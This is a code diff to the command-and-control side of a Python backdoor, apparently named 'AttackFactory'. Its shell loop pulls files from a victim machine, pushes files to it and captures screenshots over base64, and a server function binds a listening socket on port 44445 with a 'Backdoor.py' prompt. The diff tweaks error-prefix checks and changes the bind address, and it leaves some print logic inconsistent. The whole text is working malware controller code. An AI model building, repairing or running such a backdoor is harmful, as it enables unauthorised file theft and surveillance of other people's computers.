@@ -38,7 +38,7 @@ def shell():
 		
 		elif command [:8] == "download":
 			result = reliable_recv()
-			if result[:4] != '[!]':
+			if result[:3] != '[!]':
 				file = open(command [9:], "wb")
 				file.write(base64.b64decode(result))
 			else:
@@ -48,21 +48,19 @@ def shell():
 			try:
 				with open (command [7:], "rb") as fin:
 				  reliable_send (base64.b64encode(fin.read()))
-				result = "[+] uploaded successfully"
+				print(colored("[+] uploaded successfully",'green'))
 			except :
 				result = "[!] File Not Found"
 				reliable_send(result)
 			finally:
-				if result[:4] == "[!]":
-					print(colored(result,'red'))
-				else:
+				if result[:3] == "[!]":
 					print(colored(result,'green'))			
 				
 		elif command [:10] == "screenshot":
 			screen = open("screenshot d" + str(count) + ".png", "wb")		
 			image = reliable_recv()
 			image_decoded = base64.b64decode(image)
-			if image_decoded [:4] == "[!]":
+			if image_decoded [:3] == "[!]":
 				print(colored(image_decoded,'red'))
 			else:
 				screen.write(image_decoded)
@@ -111,7 +109,7 @@ def server():
 	
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-	s.bind(('192.168.2.8',44445))
+	s.bind(('192.168.2.3',44445))
 	opt = input(colored('AttackFactory@Download~Backdoor.py(Y/n)~#$ ' ,'yellow'))
 	if opt == "Y" or opt == "y":
 		try:
